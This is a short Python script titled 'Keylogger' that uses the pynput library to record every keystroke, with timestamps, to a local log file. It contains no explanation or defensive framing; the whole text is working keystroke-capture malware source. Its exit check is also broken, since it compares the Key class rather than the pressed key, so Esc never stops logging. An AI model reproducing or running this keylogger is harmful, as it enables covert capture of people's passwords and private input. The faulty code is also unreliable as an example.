# -*- coding: utf-8 -*-
"""
Created on Wed Jun 26 17:06:53 2019
Title: Keylogger
@author: VivekAlhat
"""

from pynput.keyboard import Key, Listener
import logging
import sys

#Creating a file
log_file = " "
logging.basicConfig(filename = (log_file + ' keylog.txt'), level = logging.DEBUG, format = '%(asctime)s: %(message)s:')

#Function creation
def on_press(key):
    logging.info(str(key))
    if Key == Key.esc:
        sys.exit()

with Listener(on_press) as listener:
    listener.join()
    
    